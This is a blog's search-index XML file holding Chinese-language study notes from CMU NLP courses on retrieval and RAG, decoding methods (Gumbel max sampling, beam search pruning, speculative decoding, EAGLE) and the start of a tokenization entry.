<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>11711 Advanced NLP: Retrieval and RAG</title>
      <link href="/zh/2026/02/14/11711-Advanced-NLP/11711-Advanced-NLP-Retrieval-RAG/"/>
      <url>/zh/2026/02/14/11711-Advanced-NLP/11711-Advanced-NLP-Retrieval-RAG/</url>
      
        <content type="html"><![CDATA[<h1 id="lec10-检索与rag">Lec10 检索与RAG</h1><h2 id="为什么需要检索">为什么需要检索？</h2><p>大型语言模型虽然强大，但仍存在以下问题：</p><ul><li><strong>幻觉：</strong> 生成流畅但无根据的声明。</li><li><strong>过时的知识：</strong> 模型参数无法立即反映新事实。</li><li><strong>单体记忆瓶颈：</strong> 所有知识都被压缩到固定参数中。</li></ul><p>检索增强系统将外部文档视为<strong>非参数记忆</strong>，并在推理时获取证据。</p><h2 id="检索增强语言模型核心直觉">检索增强语言模型：核心直觉</h2><p>给定查询 <span class="math inline">\(x\)</span>：</p><ol type="1"><li>从数据存储中检索前 <span class="math inline">\(k\)</span>个相关段落。</li><li>将检索到的段落 + 查询馈送到生成器。</li><li>生成基于检索证据的答案。</li></ol><p>关键组件：</p><ul><li><strong>数据存储：</strong> 语料库和索引。</li><li><strong>检索器：</strong> 将查询/文档映射到相似度分数。</li><li><strong>生成器（LM）：</strong> 产生最终响应。</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214230716495.png" alt="image-20260214230716495" style="zoom:40%;" /></p><h2 id="第一部分数据存储">第一部分：数据存储</h2><h3 id="存储什么">存储什么？</h3><p>典型选项包括：</p><ul><li>网页、论文、维基页面、领域文档。</li><li>段落级块而不是完整文档。</li><li>元数据（来源、时间戳、URL、章节标题）用于归因和过滤。</li></ul><h3 id="处理流程">处理流程</h3><p>实用流程：</p><ol type="1"><li><strong>策划：</strong> 选择与目标任务相关的来源。</li><li><strong>预处理：</strong>HTML/PDF转换为干净文本、规范化、去重。</li><li><strong>分块：</strong> 将长文档拆分为段落。</li><li><strong>索引：</strong> 构建稀疏或稠密检索索引。</li></ol><p>分块权衡：</p><ul><li>太短：缺乏上下文。</li><li>太长：引入噪声并损害检索精度。</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214230755612.png" alt="image-20260214230755612" style="zoom:40%;" /></p><h3 id="扩展考虑因素">扩展考虑因素</h3><ul><li>语料库大小可达数十亿个标记或更多。</li><li>使用ANN索引和分片实现低延迟服务。</li><li>通过定期重新索引保持文档新鲜度。</li></ul><h2 id="第二部分检索器">第二部分：检索器</h2><h3 id="稀疏检索器tf-idf-bm25">稀疏检索器（TF-IDF / BM25）</h3><p>经典词法匹配使用词袋风格向量。</p><p>TF-IDF基础： <span class="math display">\[\text{TF}(t, d)=\frac{\text{freq}(t,d)}{\sum_{t&#39;}\text{freq}(t&#39;,d)},\quad\text{IDF}(t)=\log\frac{N}{\text{df}(t)}\]</span></p><ul><li><p><strong>TF(t, d)</strong> 衡量词项 <spanclass="math inline">\(t\)</span> 在文档 <spanclass="math inline">\(d\)</span>中出现的频率，按文档长度归一化。</p></li><li><p><strong>IDF(t)</strong>衡量词项在整个语料库中的稀有程度。常见词如”the”几乎出现在每个文档中，因此<span class="math inline">\(\text{df}(t) \approx N\)</span> 且 IDF →0。</p></li><li><p>最终的TF-IDF分数就是 <span class="math inline">\(\text{TF}(t,d)\times\text{IDF}(t)\)</span>：当一个词项在本文档中频繁出现但在全局稀有时，它最重要。</p></li></ul><p>BM25分数： <span class="math display">\[\text{BM25}(q,d)=\sum_{t \in q}\text{IDF}(t)\cdot\frac{\text{TF}(t,d)(k_1+1)}{\text{TF}(t,d)+k_1\left(1-b+b\frac{|d|}{\text{avgdl}}\right)}\]</span></p><p>BM25（Best Matching25）是TF-IDF的概率精化版本，是Elasticsearch和Lucene等搜索引擎的默认排名函数。两个关键改进：</p><ul><li><strong>TF饱和</strong>（由 <span class="math inline">\(k_1\)</span>控制，通常为1.2）：随着 <spanclass="math inline">\(\text{TF}(t,d)\)</span> 增长，分数接近 <spanclass="math inline">\((k_1 + 1)\)</span>的渐近极限。这防止了文档仅因过度重复关键字而占主导地位。相比之下，原始TF-IDF线性增长无界限。</li><li><strong>文档长度归一化</strong>（由 <spanclass="math inline">\(b\)</span> 控制，通常为0.75）：项 <spanclass="math inline">\(b \cdot \frac{|d|}{\text{avgdl}}\)</span>惩罚较长文档，因为它们自然具有更高的词频。当 <spanclass="math inline">\(b = 0\)</span> 时，不应用长度归一化；当 <spanclass="math inline">\(b = 1\)</span>时，相对于平均文档长度（avgdl）进行完全归一化。</li></ul><p>优点：</p><ul><li>快速且词法精度高。</li><li>无需神经训练。</li></ul><p>缺点：</p><ul><li>对释义的语义匹配较弱。</li></ul><h3 id="稠密检索器双编码器">稠密检索器（双编码器）</h3><p>将查询和文档编码为稠密向量： <span class="math display">\[s(q,d)=\langle E_q(q), E_d(d) \rangle\]</span></p><p>常见训练使用对比学习： <span class="math display">\[\mathcal{L}=-\log \frac{\exp(s(q,d^+)/\tau)}{\exp(s(q,d^+)/\tau)+\sum_{d^-}\exp(s(q,d^-)/\tau)}\]</span></p><p>优点：</p><ul><li>更好的语义检索。</li><li>适用于释义和词法不匹配。</li></ul><p>缺点：</p><ul><li>需要训练数据和ANN基础设施。</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214232605928.png" alt="image-20260214232605928" style="zoom:50%;" /></p><h3 id="快速最近邻搜索">快速最近邻搜索</h3><p>大规模稠密检索依赖于近似最近邻（ANN）方法（例如FAISS），以微小的召回损失换取大幅延迟降低。</p><h3 id="使用交叉编码器重排序">使用交叉编码器重排序</h3><p>两阶段检索很常见：</p><ol type="1"><li>双编码器快速检索前 <span class="math inline">\(k\)</span>个候选。</li><li>交叉编码器以更高精度重排序候选列表。</li></ol><h3 id="评估指标和基准">评估指标和基准</h3><p>常用指标：</p><ul><li><strong>Recall@k</strong>：相关文档是否在前 <spanclass="math inline">\(k\)</span> 个中找到。</li><li><strong>MRR</strong>：第一个相关命中的倒数排名质量。</li><li><strong>nDCG@k</strong>：分级排名质量。</li><li><strong>Precision@k</strong>：前 <spanclass="math inline">\(k\)</span> 个命中中相关的比例。</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214232801569.png" alt="image-20260214232801569" style="zoom:40%;" /></p><p>课程中强调的基准：</p><ul><li><strong>BEIR</strong>（跨异构任务的零样本IR）。</li><li><strong>MTEB</strong>（大规模嵌入基准）。</li></ul><h2 id="第三部分如何使用检索">第三部分：如何使用检索</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214233154775.png" alt="image-20260214233154775" style="zoom:33%;" /></p><h3 id="上下文rag输入增强">上下文RAG（输入增强）</h3><p>检索证据并将其附加到提示上下文。</p><p>序列级RAG形式： <span class="math display">\[p(y \mid x) \approx \sum_{z \in \text{top-}k} p_\eta(z \midx)\,p_\theta(y \mid x, z)\]</span></p><p>标记级边际化形式： <span class="math display">\[p(y \mid x) \approx \prod_i \sum_{z \in \text{top-}k}p_\eta(z \mid x)\,p_\theta(y_i \mid x, z, y_{&lt;i})\]</span></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214233256164.png" alt="image-20260214233256164" style="zoom:40%;" /></p><h3 id="rag的训练策略">RAG的训练策略</h3><ul><li><strong>独立训练：</strong> 分别训练检索器和生成器。</li><li><strong>顺序训练：</strong> 先训练检索器，然后适配生成器。</li><li><strong>端到端训练：</strong> 联合优化检索和生成。</li></ul><h3 id="上下文rag的局限性">上下文RAG的局限性</h3><ul><li>检索可能返回不相关的段落（错误传播）。</li><li>长上下文增加成本，可能稀释有用证据。</li><li>如果提示较弱，生成器可能仍然忽略检索到的证据。</li></ul><h3 id="self-rag和自适应检索">Self-RAG和自适应检索</h3><p>Self-RAG风格的系统学习：</p><ul><li>决定<strong>是否需要检索</strong>。</li><li>决定<strong>何时在生成过程中再次检索</strong>。</li><li>用证据批评或验证生成质量。</li></ul><p>这使检索使用成为条件性的，而不是始终开启。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214234204710.png" alt="image-20260214234204710" style="zoom:30%;" /></p><h3 id="超越上下文rag">超越上下文RAG</h3><ul><li><strong>工具增强LM：</strong> 迭代调用工具/搜索API。</li><li><strong>深度研究代理：</strong> 多步检索 + 综合工作流。</li><li><strong>中间增强：</strong> RETRO /kNN-LM在隐藏状态或标记级别检索，而不仅仅是提示级别。</li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214234855647.png" alt="image-20260214234855647" style="zoom:40%;" /></p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260214234831602.png" alt="image-20260214234831602" style="zoom:40%;" /></p><h2 id="实用检查清单">实用检查清单</h2><ol type="1"><li>定义目标领域和新鲜度要求。</li><li>构建干净、良好分块的数据存储并包含元数据。</li><li>根据延迟-质量预算选择稀疏/稠密/混合检索。</li><li>如果前 <span class="math inline">\(k\)</span>质量是瓶颈，添加重排序器。</li><li>联合跟踪检索指标和端任务准确性。</li><li>添加引用和证据检查以降低幻觉风险。</li></ol><h2 id="关键要点">关键要点</h2><ul><li>RAG为LM添加外部、可更新的记忆。</li><li>质量取决于三个耦合部分：<strong>数据存储、检索器、生成器</strong>。</li><li>稠密检索 + 重排序通常是实用的高性能路径。</li><li>自适应检索（Self-RAG、工具使用）解决了静态上下文RAG的局限性。</li></ul>]]></content>
      
      
      <categories>
          
          <category> CMU 11-711 高级自然语言处理 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Natural Language Processing </tag>
            
            <tag> CMU </tag>
            
            <tag> Study Notes </tag>
            
            <tag> 11711 </tag>
            
            <tag> AI </tag>
            
            <tag> Retrieval </tag>
            
            <tag> RAG </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11868 LLM系统：解码</title>
      <link href="/zh/2026/02/13/11868-LLM-Sys/11868-LLM-Sys-Decoding/"/>
      <url>/zh/2026/02/13/11868-LLM-Sys/11868-LLM-Sys-Decoding/</url>
      
        <content type="html"><![CDATA[<h1 id="解码采样束搜索和推测性解码">解码：采样、束搜索和推测性解码</h1><blockquote><p>关于基础概念（贪婪解码、束搜索基础、采样方法、KV缓存、计算与内存限制分析），请参见我的<ahref="https://xloverflow.github.io/zh/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Learning-Inference/#Lec9-Decoding-Algorithms">11711高级NLP：解码算法</a>笔记。本文重点关注那里未涵盖的<strong>系统级</strong>细节。</p></blockquote><h2 id="高效离散采样">高效离散采样</h2><p>在每个解码步骤中，我们需要从词汇表上的分类分布中进行采样。这是一个值得优化的系统瓶颈。</p><h3 id="采样复杂度">采样复杂度</h3><p>给定<span class="math inline">\(k\)</span>个类别，概率为<spanclass="math inline">\(p_1, p_2, \ldots, p_k\)</span>，需要抽取<spanclass="math inline">\(n\)</span>个样本：</p><table><thead><tr class="header"><th>方法</th><th>复杂度</th><th>备注</th></tr></thead><tbody><tr class="odd"><td>直接采样</td><td><span class="math inline">\(O(nk)\)</span></td><td>每次线性扫描CDF</td></tr><tr class="even"><td>二分搜索</td><td><span class="math inline">\(O(k + n \log k)\)</span></td><td>构建一次CDF，每个样本二分搜索</td></tr><tr class="odd"><td>别名采样</td><td><span class="math inline">\(O(k \log k + n)\)</span></td><td>构建一次别名表，每个样本<spanclass="math inline">\(O(1)\)</span></td></tr></tbody></table><blockquote><p><strong>别名采样注意事项</strong>：别名采样的<spanclass="math inline">\(O(1)\)</span>每样本优势仅在从<strong>同一分布抽取多个样本</strong>时才有效（例如蒙特卡洛模拟）。在LLM解码中，每步分布都会变化（每个分布<spanclass="math inline">\(n=1\)</span>），因此别名表无法重用，每次必须以<spanclass="math inline">\(O(k \logk)\)</span>的代价重建——没有任何好处。这促使了下面的Gumbel Max技巧。</p></blockquote><p>在PyTorch中，标准方法是： <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">probs = torch.softmax(logits, dim=-<span class="number">1</span>)</span><br><span class="line">next_token = torch.multinomial(probs, num_samples=<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><h3 id="gumbel-max技巧">Gumbel Max技巧</h3><p>一种更快的替代方法，<strong>完全避免计算softmax</strong>。</p><p><strong>关键定理</strong>：从<spanclass="math inline">\(\text{Categorical}(\text{Softmax}(h))\)</span>采样等价于：</p><p><span class="math display">\[x_i = h_i - \log(-\log(z_i)), \quad z_i \sim \text{Uniform}(0, 1)\]</span> <span class="math display">\[\text{采样的token} = \arg\max_i \; x_i\]</span></p><p><strong>理论</strong>：<spanclass="math inline">\(x_i\)</span>服从Gumbel分布，且<spanclass="math inline">\(\arg\max_i x_i\)</span>服从<spanclass="math inline">\(\text{Categorical}\left(\frac{\exp(h_i)}{\sum_{j=1}^{k}\exp(h_j)}\right)\)</span>。</p><p><strong>为什么有用</strong>：用加法 + argmax替换softmax +多项式采样，这对硬件更友好。Gumbel噪声可以<strong>预先计算</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">GumbelSampler</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, batch_size, vocab_size, device</span>):</span><br><span class="line">        <span class="variable language_">self</span>.batch_size = batch_size</span><br><span class="line">        <span class="variable language_">self</span>.vocab_size = vocab_size</span><br><span class="line">        <span class="comment"># 预计算噪声</span></span><br><span class="line">        <span class="variable language_">self</span>.noise = <span class="variable language_">self</span>._prepare_gumbel_noise(device)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_prepare_gumbel_noise</span>(<span class="params">self, device</span>):</span><br><span class="line">        <span class="comment"># 一次性生成噪声张量</span></span><br><span class="line">        uniform_noise = torch.rand(</span><br><span class="line">            <span class="variable language_">self</span>.batch_size, <span class="variable language_">self</span>.vocab_size, device=device</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">return</span> -torch.log(-torch.log(uniform_noise))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">sample</span>(<span class="params">self, logits</span>):</span><br><span class="line">        <span class="comment"># 不使用softmax直接采样</span></span><br><span class="line">        <span class="keyword">return</span> torch.argmax(logits + <span class="variable language_">self</span>.noise, dim=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure><blockquote><p><strong>参考</strong>：Kool等人。<em>“随机束及其寻找方法：无重复采样序列的Gumbel-Top-k技巧。”</em>ICML 2019。</p></blockquote><hr /><h2 id="束搜索算法细节与剪枝">束搜索：算法细节与剪枝</h2><p>除了<ahref="https://xloverflow.github.io/zh/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Learning-Inference/#Approach-2-Beam-Search">基本束搜索概念</a>外，本节涵盖完整的算法实现和剪枝优化。</p><h3 id="算法细节">算法细节</h3><p>带优先队列的完整束搜索过程：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">best_scores = []</span><br><span class="line">将&#123;[BOS], 0.0&#125;添加到best_scores</span><br><span class="line"></span><br><span class="line">for i in 1 to max_length:</span><br><span class="line">    new_seqs = PriorityQueue()</span><br><span class="line">    for (candidate, s) in best_scores:</span><br><span class="line">        if candidate[-1] is EOS:</span><br><span class="line">            prob = 全部-inf</span><br><span class="line">            prob[EOS] = 0</span><br><span class="line">        else:</span><br><span class="line">            prob = model.forward(candidate)  # 下一个token的对数概率</span><br><span class="line"></span><br><span class="line">        从prob中选择top k分数</span><br><span class="line">        for each (score, index) in top-k:</span><br><span class="line">            new_candidate = candidate.append(index)</span><br><span class="line">            new_score = s + score</span><br><span class="line">            if not new_seqs.full():</span><br><span class="line">                将(new_candidate, new_score)添加到new_seqs</span><br><span class="line">            else if new_seqs.min_score &lt; new_score:</span><br><span class="line">                new_seqs.pop_min()</span><br><span class="line">                将(new_candidate, new_score)添加到new_seqs</span><br><span class="line"></span><br><span class="line">    best_scores = new_seqs</span><br></pre></td></tr></table></figure><p>关键实现细节： - 使用大小为<spanclass="math inline">\(k\)</span>的<strong>最小堆</strong>优先队列——总是驱逐得分最低的候选- EOS终止的序列被保留但阻止扩展（为所有token分配<spanclass="math inline">\(-\infty\)</span>，EOS除外） -得分是<strong>累积对数概率</strong>（对数概率之和）</p><h3 id="剪枝策略">剪枝策略</h3><p>为了减少计算，可以提前剪枝候选（Freitag &amp; Al-Onaizan,2017）：</p><p><strong>1. 相对阈值剪枝</strong></p><p>给定剪枝阈值<span class="math inline">\(r_p\)</span>和候选集<spanclass="math inline">\(C\)</span>，如果以下条件成立则丢弃候选<spanclass="math inline">\(c\)</span>：</p><p><span class="math display">\[\text{score}(c) \leq r_p \cdot \max_{c&#39; \in C} \text{score}(c&#39;)\]</span></p><p><strong>2. 绝对阈值剪枝</strong></p><p>如果以下条件成立则丢弃候选<spanclass="math inline">\(c\)</span>：</p><p><span class="math display">\[\text{score}(c) \leq \max_{c&#39; \in C} \text{score}(c&#39;) - a_p\]</span></p><p><strong>3. 相对局部阈值剪枝</strong></p><p>在每个扩展步骤（局部）而非全局应用阈值。</p><h3 id="结合采样和束搜索">结合采样和束搜索</h3><p>一种混合方法： 1. <strong>采样</strong>前几个token（引入多样性） 2.<strong>束搜索</strong>剩余的token（确保质量）</p><p><strong>为什么</strong>：纯束搜索倾向于产生重复、低多样性的输出。采样初始token创建多样化的前缀，束搜索将每个前缀细化为高质量的完成。</p><h3 id="代码示例">代码示例</h3><ul><li><ahref="https://github.com/llmsystem/llmsys_code_examples/blob/main/decoding/decoding.ipynb">束搜索笔记本</a></li></ul><hr /><h2 id="推测性解码深入探讨">推测性解码：深入探讨</h2><p>在<ahref="https://xloverflow.github.io/zh/2026/01/29/11711-Advanced-NLP/11711-Advanced-NLP-Learning-Inference/#Speeding-Up-a-Full-Sequence">基本推测性解码概念</a>的基础上，本节详细介绍验证机制、性能权衡和对齐考虑。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213004236882.png" alt="image-20260213004236882" style="zoom:50%;" /></p><p>回顾核心流程：小型<strong>草稿模型</strong><spanclass="math inline">\(f_{\text{draft}}\)</span>生成<spanclass="math inline">\(N\)</span>个token <spanclass="math inline">\(y_{1:N} \sim f_{\text{draft}}(\cdot \midx)\)</span>，然后大型<strong>目标模型</strong><spanclass="math inline">\(f_{\text{target}}\)</span>在单次前向传递中验证它们。</p><h3 id="验证准则">验证准则</h3><p>如果草稿token <spanclass="math inline">\(y_i\)</span>出现在目标模型的top-<spanclass="math inline">\(K\)</span>预测中，则接受：</p><p><span class="math display">\[\text{接受} y_i \quad \text{如果} \quad y_i \in\text{TopK}\left(f_{\text{target}}(\cdot \mid x, y_{1:i-1})\right)\]</span></p><p>目标模型为每个前缀计算<spanclass="math inline">\(f_{\text{target}}(\cdot \mid x,y_{1:i-1})\)</span>——但所有这些都在<strong>同一次前向传递</strong>中计算，因为因果注意力允许并行计算所有前缀位置的似然。</p><h3 id="拒绝处理">拒绝处理</h3><p>如果草稿token <spanclass="math inline">\(y_i\)</span>被<strong>拒绝</strong>，目标模型丢弃<spanclass="math inline">\(y_i\)</span>和所有后续的草稿token <spanclass="math inline">\(y_{i+1:N}\)</span>。然后目标模型从最后接受的位置开始生成。</p><p><strong>最坏情况</strong>：所有<spanclass="math inline">\(N\)</span>个token被拒绝→退回到正常的自回归解码（没有质量损失，只是浪费了草稿计算）。</p><h3 id="为什么更快">为什么更快？</h3><p>关键洞察：<strong>验证<spanclass="math inline">\(N\)</span>个token比生成<spanclass="math inline">\(N\)</span>个token更便宜</strong>。</p><ul><li><strong>生成</strong><spanclass="math inline">\(N\)</span>个token：目标模型的<spanclass="math inline">\(N\)</span>次顺序前向传递</li><li><strong>验证</strong><spanclass="math inline">\(N\)</span>个token：目标模型的<strong>1次</strong>前向传递（因果注意力同时计算所有位置的似然）</li></ul><p>草稿模型的前向传递很便宜（小模型）。所以总成本大约是：<spanclass="math inline">\(N\)</span>次便宜的草稿传递 +1次昂贵的目标传递，相比<spanclass="math inline">\(N\)</span>次昂贵的目标传递。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213004811526.png" alt="image-20260213004811526" style="zoom:30%;" /></p><h3 id="选择n草稿长度">选择<spanclass="math inline">\(N\)</span>（草稿长度）</h3><table><thead><tr class="header"><th>大<span class="math inline">\(N\)</span></th><th>小<span class="math inline">\(N\)</span></th></tr></thead><tbody><tr class="odd"><td>✅ 更高的理论加速</td><td>✅ 更低的拒绝成本</td></tr><tr class="even"><td>❌ 更高的拒绝概率</td><td>❌ 更少的并行化收益</td></tr><tr class="odd"><td>❌ 更多的softmax计算（内存压力）</td><td>✅ 更低的内存开销</td></tr><tr class="even"><td>❌ 实时应用的停顿时间更长</td><td>✅ 更适合交互使用</td></tr></tbody></table><p><strong>流行选择</strong>：<span class="math inline">\(N =4\)</span>或<span class="math inline">\(N = 8\)</span>。</p><h3 id="对齐考虑">对齐考虑</h3><p><strong>草稿-目标对齐</strong>（草稿模型近似目标的程度）至关重要： -良好对齐→低拒绝率→高加速 - 差对齐→频繁拒绝→加速被抵消</p><p><strong>最佳实践</strong>：从<strong>同一模型家族</strong>选择草稿和目标模型（例如，LLaMA-7B为LLaMA-70B起草）。</p><h3 id="实证结果">实证结果</h3><p>推测性解码已被证明： -生成与标准自回归解码<strong>质量相当</strong>的文本 -实现显著的<strong>时钟加速</strong>（通常为2-3倍），具体取决于草稿-目标对齐</p><hr /><h2id="eagle更大语言模型效率的外推算法">EAGLE：更大语言模型效率的外推算法</h2><p>EAGLE通过一个关键观察改进了普通推测性解码：<strong>预测下一个token的最终层特征比预测下一个token本身更容易</strong>。</p><h3 id="动机">动机</h3><p>普通推测性解码使用单独的小型LM作为草稿模型，它预测下一个<em>token</em>。但从完整词汇表预测离散token是困难的。EAGLE转而使用单个Transformer层预测下一个<strong>最终层特征向量</strong>，然后应用原始模型的LMhead来获得token预测。</p><h3 id="架构">架构</h3><p>EAGLE重用原始LLM的两个组件： - <strong>嵌入层</strong>（token →向量） - <strong>LM head</strong>（特征 → logits）</p><p>它添加<strong>一个小型Transformer层</strong>，其输入为： -token嵌入<spanclass="math inline">\(e_t\)</span>和目标模型的最终层特征<spanclass="math inline">\(f_t\)</span>的拼接</p><p>并输出预测的特征<spanclass="math inline">\(\hat{f}_{t+1}\)</span>，LMhead从中产生token预测。</p><p><strong>为什么嵌入 + 特征？</strong>采样的token强烈影响最终层特征。例如，在”Iam”之后，“excited”和”begin”的特征非常不同。token嵌入捕获这种离散选择，而最终层特征捕获上下文表示。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260213005252300.png" alt="image-20260213005252300" style="zoom:50%;" /></p><h3 id="树结构起草">树结构起草</h3><p>EAGLE不是生成单一的线性草稿token链，而是生成候选继续的<strong>树</strong>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">        &quot;How can&quot;</span><br><span class="line">       /        \</span><br><span class="line">    &quot;I&quot;          ...</span><br><span class="line">   /    \</span><br><span class="line">&quot;make&quot;  &quot;help&quot;</span><br><span class="line"> |       |</span><br><span class="line">&quot;a&quot;    &quot;with&quot;</span><br><span class="line">...     ...</span><br></pre></td></tr></table></figure><p>实现使用<strong>树注意力</strong>：将所有候选展平为单个序列，使用树形注意力掩码，允许高效的并行计算。</p><h3 id="训练">训练</h3><p>EAGLE的草稿层使用组合损失训练：</p><p><span class="math display">\[L = L_{\text{reg}} + w_{\text{cls}} \cdot L_{\text{cls}}\]</span></p><p><strong>回归损失</strong>（特征预测）： <span class="math display">\[L_{\text{reg}} = \text{SmoothL1}\left(f_{i+1}, \;\text{DraftModel}(T_{2:i+1}, F_{1:i})\right)\]</span></p><p>其中<span class="math inline">\(T_{2:i+1}\)</span>是token嵌入，<spanclass="math inline">\(F_{1:i} = (f_1, \ldots,f_i)\)</span>是目标模型特征。</p><p><strong>分类损失</strong>（token预测）： <spanclass="math display">\[L_{\text{cls}} = \text{CrossEntropy}\left(p_{i+2}, \;\hat{p}_{i+2}\right)\]</span></p><p>其中<span class="math inline">\(p_{i+2} =\text{Softmax}(\text{LMHead}(f_{i+1}))\)</span>和<spanclass="math inline">\(\hat{p}_{i+2} =\text{Softmax}(\text{LMHead}(\hat{f}_{i+1}))\)</span>。</p><h3 id="结果">结果</h3><p>EAGLE在MT-Bench上实现了比普通推测性解码显著更快的解码，质量退化极小。</p><h3 id="进一步改进">进一步改进</h3><ul><li><strong>EAGLE-2</strong>：在草稿树中剪枝低置信度token，减少浪费的计算</li><li><strong>EAGLE-3</strong>：将方法扩展到更大的训练数据集以获得更好的草稿质量</li></ul><h3 id="代码">代码</h3><ul><li><ahref="https://github.com/llmsystem/llmsys_code_examples/blob/main/speculative_decoding/Speculative_decoding_demo.ipynb">推测性解码演示</a></li><li><ahref="https://github.com/llmsystem/llmsys_code_examples/blob/main/speculative_decoding/EAGLE/demo.py">EAGLE演示</a></li></ul><hr /><h2 id="总结">总结</h2><table><thead><tr class="header"><th>方法</th><th>类型</th><th>关键思想</th></tr></thead><tbody><tr class="odd"><td>Gumbel Max技巧</td><td>高效采样</td><td>用加法 + argmax替换softmax + 多项式</td></tr><tr class="even"><td>束搜索剪枝</td><td>搜索优化</td><td>提前丢弃低分候选</td></tr><tr class="odd"><td>推测性解码</td><td>加速</td><td>便宜起草，并行验证</td></tr><tr class="even"><td>EAGLE</td><td>改进推测</td><td>预测特征而非token，树结构草稿</td></tr></tbody></table><p><strong>关键要点</strong>：从系统角度来看，LLM解码的瓶颈是自回归生成的顺序、内存限制性质。推测性解码和EAGLE通过将串行生成转换为并行验证来解决这个问题——基本洞察是<strong>验证比生成更便宜</strong>（使用因果注意力）。</p><h2 id="参考文献">参考文献</h2><ol type="1"><li>Freitag &amp; Al-Onaizan。“神经机器翻译的束搜索策略。” 2017。</li><li>Kool等人。“随机束及其寻找方法：无重复采样序列的Gumbel-Top-k技巧。”ICML 2019。</li><li>Leviathan等人。“通过推测性解码实现Transformer的快速推理。” ICML2023。</li><li>Li等人。“EAGLE：推测性采样需要重新思考特征不确定性。” ICML2024。</li></ol><hr /><p><em>本文基于CMU 11-868 LLM系统课程（Lei Li教授）的讲座材料。</em></p>]]></content>
      
      
      <categories>
          
          <category> CMU 11-868 LLM系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CMU </tag>
            
            <tag> 11868 </tag>
            
            <tag> LLM系统 </tag>
            
            <tag> 解码 </tag>
            
            <tag> 推测性解码 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>11868 LLM Sys: Tokenization and Embedding</title>
      <link href="/zh/2026/02/12/11868-LLM-Sys/11868-LLM-Sys-Tokenization-and-Embedding/"/>
      <url>/zh/2026/02/12/11868-LLM-Sys/11868-LLM-Sys-Tokenization-and-Embedding/</url>
      
        <content type="html"><![CDATA[<h1 id="分词与嵌入">分词与嵌入</h1><h2 id="什么是分词">什么是分词？</h2><p>分词是将文本拆分为可以被语言模型处理的基本单元（标记）的过程。许多单词并不映射到单个标记——例如，“indivisible”可能会被拆分为多个子词标记。</p><p>一般流程如下： 1. <strong>分词器</strong>：将文本拆分为标记 ID 2.<strong>嵌入表查找</strong>：将标记 ID 转换为向量表示</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20260212204629477.png" alt="image-20260212204629477" style="zoom:30%;" /></p><h2 id="简单的分词方法">简单的分词方法</h2><h3 id="基于词的分词">基于词的分词</h3><p><strong>方法</strong>：通过空格和标点符号拆分文本</p><p><strong>示例</strong>： - 英语、法语、德语、西班牙语效果良好 -特殊处理：数字用特殊标记 <code>[number]</code> 替代</p><p><strong>示例</strong>： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;The most eager is Oregon which is enlisting 5,000 drivers in the country&#x27;s biggest experiment.&quot;</span><br><span class="line">↓</span><br><span class="line">[&quot;The&quot;, &quot;most&quot;, &quot;eager&quot;, &quot;is&quot;, &quot;Oregon&quot;, &quot;which&quot;, &quot;is&quot;, &quot;enlisting&quot;, &quot;5,000&quot;, &quot;drivers&quot;, ...]</span><br></pre></td></tr></table></figure></p><p><strong>挑战</strong>：什么才算是一个“单词”？ - 附加词： “Bob’s” -复合词： “handyman” - 多词表达： “do-it-yourself” - 缩写： 